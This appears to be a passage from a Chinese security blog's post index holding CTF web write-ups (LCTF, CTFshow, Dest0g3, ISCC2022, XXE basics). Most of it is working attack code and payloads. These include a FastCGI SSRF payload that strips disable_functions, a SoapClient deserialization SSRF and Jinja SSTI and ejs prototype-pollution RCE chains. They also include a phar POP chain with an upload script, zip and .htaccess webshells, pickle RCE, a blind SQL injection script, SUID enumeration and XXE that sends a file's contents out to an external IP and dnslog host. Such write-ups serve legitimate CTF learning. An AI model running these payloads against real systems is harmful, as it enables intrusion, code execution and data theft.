$code).\"\\n\";\n?>\n```\n\n生成payload后访问\n\n```\nhack.php?file=ftp://45.15.131.101:9999/&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00\n```\n\n反弹shell成功，提权，查看有suid的命令\n\n```shell\nfind / -perm -u=s -type f 2>/dev/null\n/bin/mount\n/bin/su\n/bin/umount\n/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/passwd\n/usr/local/bin/php\n```\n\n用php命令行模式，同样先绕过open_basedir，再readfile读取flag即可\n\n## bestphp's revenge\n\n上来就是一个源码\n\n```php\n<?php\nhighlight_file(__FILE__);\n$b = 'implode';\ncall_user_func($_GET['f'], $_POST);\nsession_start();\nif (isset($_GET['name'])) {\n    $_SESSION['name'] = $_GET['name'];\n}\nvar_dump($_SESSION);\n$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');\ncall_user_func($b, $a);//此处如果不更改$b那么就会直接将$a合并为字符串然后返回\n?>\n//还有一个flag.php\nsession_start();\necho 'only localhost can get flag!';\n$flag = 'LCTF{*************************}';\nif($_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\"){\n       $_SESSION['flag'] = $flag;\n   }\nonly localhost can get flag!\n```\n\n明显是SSRF了，[[HFCTF2020]BabyUpload](https://jlan.darkflow.top/posts/210d3ac7.html#HFCTF2020-BabyUpload)这里有php的session存储引擎相关内容，php中默认使用的是PHP引擎，修改引擎使用`ini_set('session.serialize_handler', '需要设置的引擎');`即可修改，此处我们通过不同的session存储读取方法即可导致反序列化，而SSRF只需要通过原生类中的`SoapClient`类反序列化执行`__call`方法就行\n\n首先构造`SoapClient`类\n\n```php\n<?php\n$url = \"http://127.0.0.1/flag.php\";\n$b = new SoapClient(null, array('uri' => $url, 'location' => $url));\n$a = serialize($b);\n$a = str_replace('^^', \"\\r\\n\", $a);\necho \"|\" . urlencode($a);\n?>\n```\n\n然后上传，使得反序列化被执行\n\n```\n/?f=session_start&name=|O%3A10%3A%22SoapClient%22%3A3%3A%7Bs%3A3%3A%22uri%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D\nserialize_handler=php_serialize\n```\n\n调用类中不存在的方法触发`__call`\n\n```\n/?f=extract&name=SoapClient\nb=call_user_func\n```\n\nvar_dump查看SESSIONID，最终改Cookie拿flag\n\n"},{"title":"CTFshow黑盒测试","url":"/posts/c8094d2d.html","content":"\n**380**\n\n扫目录扫除page.php文件\n\n打开提示文件不存在，传参包含flag.php\n\n**381**\n\n```\n打开page_$id.php失败\n```\n\n这次变了，目录穿越能拿到源码，但没有什么用，回首页发现css文件路径很奇怪，访问得到flag\n\n**382**\n\n同上题目录，不过需要登录，万能密码即可\n\n**383**\n\n同上\n\n**384**\n\n提示：`密码前2位是小写字母，后三位是数字`\n\n爆破咯，结果是xy123\n\n"},{"title":"Dest0g3 520迎新赛","url":"/posts/41a3f068.html","content":"\n## phpdest\n\n包含log文件改User-Agent\n\n```\npayload:\n?file=/var/log/nginx/access.log\n\nUser-Agent: <?php var_dump($flag);?>\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011423203.png)\n\n\n\n## EasyPHP\n\n```php\n<?php\nhighlight_file(__FILE__);\ninclude \"fl4g.php\";\n$dest0g3 = $_POST['ctf'];\n$time = date(\"H\");\n$timme = date(\"d\");\n$timmme = date(\"i\");\nif(($time > \"24\") or ($timme > \"31\") or ($timmme > \"60\")){\n    echo $fl4g;\n}else{\n    echo \"Try harder!\";\n}\nset_error_handler(\n    function() use(&$fl4g) {\n        print $fl4g;\n    }\n);\n$fl4g .= $dest0g3;\n?>\n```\n\ntime条件是不可能满足了，看下面的自定义错误函数，只需要让程序产生错误就行，.运算用于拼接字符串，传入数组即可\n\n```\npayload:\nPOST\nctf[]=1\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011423502.png)\n\n## SimpleRCE\n\nglob协议得到文件名，再使用fopen打开文件，fread读取内容\n\n```\npayload:\nPOST\naaa=echo(fread(fopen(end(glob('/f*')),'r'),100));\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011423683.png)\n\n## EasySSTI\n\n先给个一次性payload\n\n```\nusername={%25set%0dpoint=config|string|truncate(4)|last%25}\n{%25set%0dcxhx=config|join|truncate(28)|replace(point,wu)|last%25}\n{%25set%0dca=config|join|truncate(23)|replace(point,wu)|last|lower%25}\n{%25set%0dcb=config|join|truncate(9)|replace(point,wu)|last|lower%25}\n{%25set%0dcc=config|join|truncate(31)|replace(point,wu)|last|lower%25}\n{%25set%0dcd=config|join|truncate(7)|replace(point,wu)|last|lower%25}\n{%25set%0dce=config|join|truncate(4)|replace(point,wu)|last|lower%25}\n{%25set%0dcf=config|join|truncate(98)|replace(point,wu)|last|lower%25}\n{%25set%0dcg=config|join|truncate(11)|replace(point,wu)|last|lower%25}\n{%25set%0dch=config|join|truncate(203)|replace(point,wu)|last|lower%25}\n{%25set%0dci=config|join|truncate(16)|replace(point,wu)|last|lower%25}\n{%25set%0dcj=config|join|truncate(429)|replace(point,wu)|last|lower%25}\n{%25set%0dck=config|join|truncate(75)|replace(point,wu)|last|lower%25}\n{%25set%0dcl=config|join|truncate(96)|replace(point,wu)|last|lower%25}\n{%25set%0dcm=config|join|truncate(81)|replace(point,wu)|last|lower%25}\n{%25set%0dcn=config|join|truncate(5)|replace(point,wu)|last|lower%25}\n{%25set%0dco=config|join|truncate(21)|replace(point,wu)|last|lower%25}\n{%25set%0dcp=config|join|truncate(19)|replace(point,wu)|last|lower%25}\n{%25set%0dcq=config|join|truncate(294)|replace(point,wu)|last|lower%25}\n{%25set%0dcr=config|join|truncate(20)|replace(point,wu)|last|lower%25}\n{%25set%0dcs=config|join|truncate(14)|replace(point,wu)|last|lower%25}\n{%25set%0dct=config|join|truncate(12)|replace(point,wu)|last|lower%25}\n{%25set%0dcu=config|join|truncate(10)|replace(point,wu)|last|lower%25}\n{%25set%0dcv=config|join|truncate(6)|replace(point,wu)|last|lower%25}\n{%25set%0dcx=config|join|truncate(30)|replace(point,wu)|last|lower%25}\n{%25set%0dcy=config|join|truncate(77)|replace(point,wu)|last|lower%25}\n{%25set%0dcz=config|join|truncate(533)|replace(point,wu)|last|lower%25}\n{%25set%0dglo=cxhx%2Bcxhx%2Bcg%2Bcl%2Bco%2Bcb%2Bca%2Bcl%2Bcs%2Bcxhx%2Bcxhx%25}\n{%25set%0dcla=cxhx%2Bcxhx%2Bcc%2Bcl%2Bca%2Bcs%2Bcs%2Bcxhx%2Bcxhx%25}\n{%25set%0dooo=lipsum|attr(glo)|attr(cp%2Bco%2Bcp)(co%2Bcs)%25}\n{%25set%0da1=config|string|truncate(300)|replace(point,wu)|list%25}\n{{a1|attr(cp%2Bco%2Bcp)()}}\n{{a1|attr(cp%2Bco%2Bcp)()}}\n{%25set%0dgang=a1|attr(cp%2Bco%2Bcp)()%25}\n{%25set%0da2=config|list|string|truncate(20)|replace(point,wu)|list%25}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{%25set%0dspace=a2|attr(cp%2Bco%2Bcp)()%25}\n{{ooo|attr(cp%2Bco%2Bcp%2Bce%2Bcn)(cc%2Bca%2Bct%2Bspace%2Bgang%2Bcf%2Bcl%2Bca%2Bcg)|attr(cr%2Bce%2Bca%2Bcd)()}}\n```\n\nban的真多////////////\n\n一个获取所有字母的小脚本\n\n```python\nstr=\"ENVDEBUGTESTINGPROPAGATE_EXCEPTIONSPRESERVE_CONTEXT_ON_EXCEPTIONSECRET_KEYPERMANENT_SESSION_LIFETIMEUSE_X_SENDFILESERVER_NAMEAPPLICATION_ROOTSESSION_COOKIE_NAMESESSION_COOKIE_DOMAINSESSION_COOKIE_PATHSESSION_COOKIE_HTTPONLYSESSION_COOKIE_SECURESESSION_COOKIE_SAMESITESESSION_REFRESH_EACH_REQUESTMAX_CONTENT_LENGTHSEND_FILE_MAX_AGE_DEFAULTTRAP_BAD_REQUEST_ERRORSTRAP_HTTP_EXCEPTIONSEXPLAIN_TEMPLATE_LOADINGPREFERRED_URL_SCHEMEJSON_AS_ASCIIJSON_SORT_KEYSJSONIFY_PRETTYPRINT_REGULARJSONIFY_MIMETYPETEMPLATES_AUTO_RELOADMAX_COOKIE_SIZE\"\nfor i in \"abcdefghijklmnopqrstuvwxyz\":\n    kkk=0\n    for j in str:\n        if i==j.lower():\n            print(j)\n            ini=str.find(j)+4\n            print(f\"字符{i}：set%0dc{i}=config|join|truncate({ini})|replace(point,wu)|last|lower\")\n            break\n```\n\n使用做出的字符变量拼接使用，反复使用pop直到拿到自己想要的字符，最后将os模块pop出进行使用（这也导致了这个payload只能一次性使用，使用一次破坏一次环境）\n\n## funny_upload\n\n.htaccess解析漏洞\n\n先构造htaccess文件内容\n\n```\nAddType application/x-httpd-php .png\n```\n\n上传图片发现确实被以php文件解析了，而后尝试构造图片马，最终发现`<?`被过滤，尝试各种标签（php7不支持）绕过无果，00%截断无果，查询得知htaccess也有类似.user.ini的文件包含功能`php_value auto_append_file  \"文件名\"`相当于执行`include(\"文件名\")`此处可使用PHP过滤器，所以可以先构造a文件包含base64编码后的木马，而后再使用过滤器解码包含执行\n\n```\n//1.png\nPD9waHAgZXZhbCgkX1BPU1RbJ2trayddKTs/Pg==\n//.htaccess\nAddType application/x-httpd-php .png\nphp_value auto_append_file \"php://filter/convert.base64-decode/resource=1.png\"\n```\n\n此时再上传任意png并访问即可执行图片马（居然还ban系统命令执行）\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011424854.png)\n\n**后面就是跟着各位大佬WP做出来并且学习到的新知识啦**\n\n## PharPOP\n\n进去之后首先发现传不进去东西，由于Error的存在直接传入无法调用`__destruct`方法也就不能上传文件，看了大佬wp发现是通过构造和反序列化字符串不相等的变量声明数量来导致反序列化过程报错，使得内容被销毁执行`__destruct`方法\n\n下一步就是构造反序列化链了，最终利用到的是air中的`__set`方法利用PHP原生类读文件\n\n> 要触发air类的`__set`魔术方法，需要给不可访问属性赋值，apple类中`__get`有赋值 ，触发`__get`需要读取不可访问属性的值，需要触发tree中`__call`，`__call`是要调用内部不存在的方法，tree中`__destruct`方法内return $this->name();。\n>\n> 再回到air类，我们需要p(value)，p为DirectoryIterator，value为glob://xxxx，又因为apple-get触发air-set，所以apple-flag的值会传给 value，所以让`apple ->flag=‘glob://xxx’` 对于$p，air-get中$p=nana中不存在act属性，`_̲_get`被触发，返回act，…p为act，所以让act=DirectoryIterator。\n>\n> 回到最外层的tree，要触发`__destruct`方法需要利用phpGC机制\n>\n> ————————————————\n> 原文链接：https://blog.csdn.net/weixin_46081055/article/details/125046554\n\n最终构造的exp如下\n\n```php\n<?php\nclass air{\n    public $p;\n}\n\nclass tree{\n    public $name;\n    public $act;\n}\n\nclass apple {\n    public $xxx;\n    public $flag;\n}\nclass banana {\n}\n\n$air = new air();\n$tree = new tree();\n$apple = new apple();\n$bana =new  banana();\n$apple ->flag='glob:///f*';\n$apple ->xxx= $air ;\n$air->p=$bana;\n$bana->act=\"DirectoryIterator\";\n$tree->name= $apple;\n\n$phar = new Phar(\"phar1.phar\"); //后缀名必须为phar\n$phar->startBuffering();\n$phar->setStub(\"<?php __HALT_COMPILER(); ?>\"); //设置stub\n$phar->setMetadata([0=>$tree,1=>NULL]); //将自定义的meta-data存入manifest\n$phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n//签名自动计算\n$phar->stopBuffering(); ?>\n```\n\n在这里我们要修改一下生成的phar文件，触发php的垃圾回收机制来让tree的`__destruct`方法执行\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205311902654.png)\n\n将此处的1修改为0\n\n因为**反序列化的过程是顺序执行**的，所以到第一个属性时，会将`Array[0]`设置为`tree`对象，同时我们又将`Array[0]`设置为`null`，这样前面的`tree`对象便丢失了引用，就会被GC所捕获，就可以执行`__destruct`了。\n\n此时由于phar文件被修改，所以我们需要修复一下文件签名，python脚本如下\n\n```python\nfrom hashlib import sha1\nf = open('./phar1.phar', 'rb').read() # 修改内容后的phar文件\ns = f[:-28] # 获取要签名的数据\nh = f[-8:] # 获取签名类型以及GBMB标识\nnewf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMB\nopen('phar2.phar', 'wb').write(newf) # 写入新文件\n```\n\n下一步就是要将文件上传上去了，这里用python脚本来将内容上传\n\n```python\nimport requests\nimport gzip\nimport re\n\nurl = 'http://602ad6c4-4397-47e9-a1ea-d957fe9c0e7c.node4.buuoj.cn:81/'\n\nfile = open(\"./phar2.phar\", \"rb\") #打开文件\nfile_out = gzip.open(\"./phar.zip\", \"wb+\")#创建压缩文件对象，因为不压缩过不了WAF\nprint(file_out)\nfile_out.writelines(file)\nfile_out.close()\nfile.close()\nres=requests.post(\n    url,\n    data={\n        1: 'O:1:\"D\":2:{s:5:\"start\";s:1:\"w\";}',\n        0: open('./phar.zip', 'rb').read()\n    },\n)\nprint(res.text)\n# file_get_contents触发phar反序列化\nres2 = requests.post(\n    url,\n    data={\n        1: 'O:1:\"D\":2:{s:5:\"start\";s:1:\"r\";}',\n        0: 'phar:///tmp/6e1fdc42161a607b4fcdec2222a38881.jpg'\n    }\n)\nprint(res2.text)\n```\n\n拿到flag\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205311910669.png)\n\n## ezip\n\n首先是个zip利用的[大佬总结](https://ucasers.cn/zip在CTF-web方向中的一些用法/)，这里要利用的是这个\n\n> 这里根据zip里面压缩着的文件一个个解压，只要执行过`php_zip_extract_file`函数，相应的文件夹之下就会出现那个对应的文件。也就是说如果zip包里面第一个文件能被解压但是第二个文件有错误的话，整个命令的的执行会报错但第一个文件在报错前已经被写下来了。\n>\n> 里面有一个关于php解压漏洞的，如果压缩包其中有一个文件的文件名巨长，就会报错，但是里面的木马已经被解压了。所以直接拿那个脚本进行一波跑：\n\n```python\nimport zipfile\nimport io\n \nmf = io.BytesIO()\nwith zipfile.ZipFile(mf, mode=\"w\", compression=zipfile.ZIP_STORED) as zf:\n    zf.writestr('1.php', b'@<?php eval($_POST[1])?>')\n    zf.writestr('A'*5000, b'AAAAA')\n \nwith open(\"shell.zip\", \"wb\") as f:\n    f.write(mf.getvalue())\n```\n\n尝试读取flag发现没有权限，whoami之后发现用户为www-data，[suid提权](https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html)，nl命令走\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205311941868.png)\n\n捞到flag\n\n## NodeSoEasy\n\n题目中给了源码，也给了所使用框架的版本号，非常明显的原型链污染，但是在ejs 3.1.7中已经将`outputFunctionName`的原型链污染漏洞修复了~~所以我用这个链子干了半天也没结果~~，看wp利用的是另一个链子`escapeFunction`\n\n```javascript\n{\"__proto__\":{\"__proto__\":{\"client\":true,\"escapeFunction\":\"1; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');\",\"compileDebug\":true}}}\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205312011891.png)\n\n## middle\n\npickle反序列化捏，自己构造脚本咯\n\n```php\nimport base64\nimport pickle\nimport config\ndef backdoor():\n    return 1;\nclass People(object):\n    def __reduce__(self):\n        return (config.backdoor, ([\"os.popen('cat /flag*').read()\"],))\na = People()\nc = pickle.dumps(a)\nprint(base64.b64encode(c))\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"ISCC2022","url":"/posts/8cbc7f95.html","content":"\n### Easy-SQL\n\nselect被ban了，只能先尝试捞出数据库了\n\n```\ndatabase：security\nuser：test\nversion：8.0.28\n```\n\n没有select只能看MySQL8的新特性了\n\n使用mysql8.x的新增命令values直接union输出\n\n**系统表更换为InnoDB表**\n\n系统表全部换成事务型的innodb表，默认的MySQL实例将不包含任何MyISAM表，除非手动创建MyISAM表\n\n**TABLE STATEMENT**\n\ntable语句是mysql8.0.19引入的语句，作用是返回表的全部内容，也就是返回表的行和列\n\n```sql\ntable mysql.user union mysql.user\n```\n\n**VALUES STATEMENT**\n\nvalues语句通过给出值的方式直接组成一个表，也就是可以把一个或者多个数据作为表来展示出来，返回的是一个表数据,当用union查询时，列数如果不对会发生报错\n\n```sql\nvalues row(1,2,3),row(2,3,4);\nvalues row(1,2,3) union values row(2,3,4);\n```\n\n利用`?id=0||('~','','','','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit 1)`\n\n找到information_schema.columns中共有22列数据，脚本爆破出表名\n\n```python\nimport requests\n\nurl = \"http://59.110.159.206:7010/?id=\"\nfor k in range(732, 740):\n    table = \"\"\n    column = \"\"\n    for j in range(732, 739):\n        for l in range(1, 100):\n            for i in range(1, 127):\n                ttable = table + chr(i)\n                com = f\"0||('def','security','{ttable}','','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit {k},1)\"\n                tex = requests.get(url + com).text\n                if \"Dumb\" in tex:\n                    table = table + chr(i - 1)\n                    print(table)\n                    break\n            com = f\"0||('def','security','{table + chr(33)}','','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit {k},1)\"\n            tex = requests.get(url + com).text\n            if \"Dumb\" in tex:\n                print(table)\n                for l in range(1, 100):\n                    for i in range(1, 127):\n                        tcolumn = column + chr(i)\n                        com = f\"0||('def','security','{table}','{tcolumn}','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit {k},1)\"\n                        tex = requests.get(url + com).text\n                        if \"Dumb\" in tex:\n                            column = column + chr(i - 1)\n                            break\n                    com = f\"0||('def','security','{table}','{column + chr(33)}','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit {k},1)\"\n                    tex = requests.get(url + com).text\n                    if \"Dumb\" in tex:\n                        print(table + '.' + column)\n                        break\n        break\n\n```\n\n列名同样\n\n```\nsecurity\n\tusers\n\t\tID\n\t\tUSERNAME\n\t\tPASSWD\n\temails\n\t\tG\n\t\tQ\n\t\t=\n\tflag\n\t\tG\n\t\tFe\n```\n\n使用union table来捞出邮箱\n\n```\n?id=0 union (table security.emails limit 7,1)\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-04 16.00.43.png)\n\n看源码\n\n```php\n<?php\ninclude \"./config.php\";\n// error_reporting(0);\n// highlight_file(__FILE__);\n$conn = mysqli_connect($hostname, $username, $password, $database);\n   if ($conn->connect_errno) {\n    die(\"Connection failed: \" . $conn->connect_errno);\n} \n\necho \"Where is the database?\".\"<br>\";\n\necho \"try ?id\";\n\nfunction sqlWaf($s)\n{\n    $filter = '/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|>|<|;|\"|\\^|\\||\\ |\\'/i';\n    if (preg_match($filter,$s))\n        return False;\n    return True;\n}\n\nif (isset($_GET['id'])) \n{\n    $id = $_GET['id'];\n    $sql = \"select * from users where id=$id\";\n    $safe = preg_match('/select/is', $id);\n    if($safe!==0)\n        die(\"No select!\");\n    $result = mysqli_query($conn, $sql);\n    if ($result) \n    {\n        $row = mysqli_fetch_array($result);\n        echo \"<h3>\" . $row['username'] . \"</h3><br>\";\n        echo \"<h3>\" . $row['passwd'] . \"</h3>\";\n    }\n    else\n        die('<br>Error!');\n}\n\n\nif (isset($_POST['username']) && isset($_POST['passwd'])) \n{\n\n    $username = strval($_POST['username']);\n    $passwd = strval($_POST['passwd']);\n\n    if ( !sqlWaf($passwd) )\n        die('damn hacker');\n\n    $sql = \"SELECT * FROM users WHERE username='${username}' AND passwd= '${passwd}'\";\n    $result = $conn->query($sql);\n    if ($result->num_rows > 0) {\n        $row = $result->fetch_assoc();\n        if ( $row['username'] === 'admin' && $row['passwd'] )\n        {\n            if ($row['passwd'] == $passwd)\n            {\n                die($flag);\n            } else {\n                die(\"username or passwd wrong, are you admin?\");\n            }\n        } else {\n            die(\"wrong user\");\n        }\n    } else {\n        die(\"user not exist or wrong passwd\");\n    }\n}\nmysqli_close($conn); \n?>\n\n```\n\n要求结果中查询出的用户名为admin并且提交的密码和查询的密码相同才能拿到flag，在passwd处做了过滤，那么我们就在username处进行注入就行了，在上面已经得到了users表共有三列，直接union select构造我们自己的username和passwd\n\n```\npayload:\nPOST\nusername='union select '1','admin','1'%23&passwd=1\n```\n\n### 冬奥会\n\narray_search弱比较，传入数字即可\n\n```\npayload:?Information={\"year\":\"2022a\",\"items\":[0,[1,2],1]}\n```\n\n### findme\n\n```php\n<?php \nhighlight_file(__FILE__); \n\nclass a{ \n    public $un0; \n    public $un1; \n    public $un2; \n    public $un3; \n    public $un4; \n     \n    public function __destruct(){ \n        if(!empty($this->un0) && empty($this->un2)){ \n            $this -> Givemeanew(); \n            if($this -> un3 === 'unserialize'){ \n                $this -> yigei(); \n            } \n            else{ \n                $this -> giao(); \n            } \n        } \n    } \n\n    public function Givemeanew(){ \n        $this -> un4 = new $this->un0($this -> un1); \n    } \n\n    public function yigei(){ \n        echo 'Your output: '.$this->un4; \n    } \n     \n    public function giao(){ \n        @eval($this->un2); \n    } \n     \n    public function __wakeup(){ \n        include $this -> un2.'hint.php'; \n    } \n} \n\n$data = $_POST['data']; \nunserialize($data);\n```\n\n原生类反序列化，先用伪协议读出提示\n\n","tags":["CTF","web"]},{"title":"CTFshowXXE","url":"/posts/949d2db6.html","content":"\n## XML基础知识\n\n要了解xxe漏洞，那么一定得先明白基础知识，了解xml文档的基础组成。\n\n> XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素\n\n### xml的基本格式\n\n```\n- 所有 XML 元素都须有关闭标签\n- XML 标签对大小写敏感\n- XML 必须正确地嵌套\n- XML 文档必须有根元素\n- XML 的属性值须加引号\n```\n\n这里放一个正规的例子\n\n```xml\n<bookstore> <!--根元素-->\n<book category=\"COOKING\"> <!--bookstore的子元素，category为属性-->\n<title>Everyday Italian</title>      <!--book的子元素，lang为属性-->\n<author>Giada De Laurentiis</author>       <!--book的子元素-->\n<year>2005</year> <!--book的子元素-->\n<price>30.00</price> <!--book的子元素-->\n</book> <!--book的结束-->\n</bookstore> <!--bookstore的结束-->\n```\n\n### DTD\n\n文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。带有DTD的XML文档实例\n\n```xml-dtd\n<?xml version=\"1.0\"?>//这一行是 XML 文档定义\n<!DOCTYPE message [\n<!ELEMENT message (receiver ,sender ,header ,msg)>\n<!ELEMENT receiver (#PCDATA)>\n<!ELEMENT sender (#PCDATA)>\n<!ELEMENT header (#PCDATA)>\n<!ELEMENT msg (#PCDATA)>\n```\n\n上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这样\n\n```xml\n<message>\n<receiver>Myself</receiver>\n<sender>Someone</sender>\n<header>TheReminder</header>\n<msg>This is an amazing book</msg>\n</message>\n```\n\n### 内部实体\n\n带有DTD的XML文档实例\n\n```xml-dtd\n<?xml version=\"1.0\"?>//这一行是 XML 文档定义\n<!DOCTYPE message [\n<!ELEMENT message (receiver ,sender ,header ,msg)>\n<!ELEMENT receiver (#PCDATA)>\n<!ELEMENT sender (#PCDATA)>\n<!ELEMENT header (#PCDATA)>\n<!ELEMENT msg (#PCDATA)>\n<message>\n<receiver>Myself</receiver>\n<sender>Someone</sender>\n<header>TheReminder</header>\n<msg>This is an amazing book</msg>\n</message>\n```\n\n其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的\n\n```xml-dtd\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe \"test\" >]>\n```\n\n这里 定义元素为`ANY`说明接受任何元素，但是定义了一个 xml 的实体（实体其实可以看成一个变量，到时候我们可以在 XML 中通过 & 符号进行引用），那么 XML 就可以写成这样\n\n```xml-dtd\n<creds>\n<user>&xxe;</user>\n<pass>mypass</pass>\n</creds>\n```\n\n我们使用&xxe对上面定义的xxe实体进行了引用，到时候输出的时候&xxe就会被 “test” 替换。\n\n### 外部实体\n\n实体分为两种，内部实体和外部实体，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：\n\n```xml-dtd\n<?xml version=\"1.0\"?>\n<!DOCTYPE root-element SYSTEM \"file:///c:/test.dtd\">\n<note>\n<to>Y0u</to>\n<from>@re</from>\n<head>v3ry</head>\n<body>g00d!</body>\n</note>\n```\n\n```xml-dtd\n<!ELEMENT to (#PCDATA)><!--定义to元素为”#PCDATA”类型-->\n<!ELEMENT from (#PCDATA)><!--定义from元素为”#PCDATA”类型-->\n<!ELEMENT head (#PCDATA)><!--定义head元素为”#PCDATA”类型-->\n<!ELEMENT body (#PCDATA)><!--定义body元素为”#PCDATA”类型-->\n```\n\n![](https://img-blog.csdnimg.cn/20210305225448278.png)\n\n当然，还有一种引用方式是使用 引用公用 DTD 的方法，语法如下：\n\n```xml-dtd\n<!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”>\n```\n\n这个在我们的攻击中也可以起到和 SYSTEM 一样的作用\n\n我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体）\n\n### 通用实体\n\n用`&实体名;` 引用的实体，他在DTD 中定义，在 XML 文档中引用\n\n```xml-dtd\n<?xml version=\"1.0\" encoding=\"utf-8\"?> \n<!DOCTYPE updateProfile [<!ENTITY file SYSTEM \"file:///c:/windows/win.ini\"> ]> \n<updateProfile>  \n    <firstname>Joe</firstname>  \n    <lastname>&file;</lastname>  \n    ... \n</updateProfile>\n```\n\n### 参数实体\n\n(1)使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 %实体名; 引用\n(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体\n(3)和通用实体一样，参数实体也可以外部引用\n\n```xml-dtd\n<!ENTITY % an-element \"<!ELEMENT mytag (subtag)>\"> \n<!ENTITY % remote-dtd SYSTEM \"http://somewhere.example.org/remote.dtd\"> \n%an-element; %remote-dtd;\n```\n\n在了解了基础知识后，下面开始了解xml外部实体注入引发的问题\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n**373**\n\n最简单的版本咯，带回显直接构造\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE xml [\n<!ENTITY xxe SYSTEM \"file:///flag\">\n]>\n<j1an>\n<ctfshow>&xxe;</ctfshow>\n</j1an>\n```\n\n**374**\n\n没有回显需要外带了\n\n```xml-dtd\n<?xml version=\"1.0\"?>\n<!DOCTYPE xml [\n<!ENTITY file SYSTEM \"file:///flag\">\n<!ENTITY xxe SYSTEM \"http://&file;.i1ecvd.dnslog.cn\">\n]>\n<j1an>\n<ctfshow>&xxe;</ctfshow>\n</j1an>\n```\n\n这种方法不知道为啥带不出来\n\n```xml-dtd\n<!DOCTYPE ANY[\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\">\n<!ENTITY % remote SYSTEM \"http://20.231.29.154/1.xml\">\n%remote;\n%send;\n]>\n```\n\n```xml-dtd\n#1.xml\n<!ENTITY % all\n\"<!ENTITY &#x25; send SYSTEM 'http://20.231.29.154/1.php?1=%file;'>\"\n>\n&all;\n```\n\n","tags":["CTF","web"]},{"title":"CTFshowSSRF","url":"/posts/b1fc6cca.html","content":"\n## SSRF基础\n\nSSRF(Server-Side Request Forgery:服务器端请求伪造) 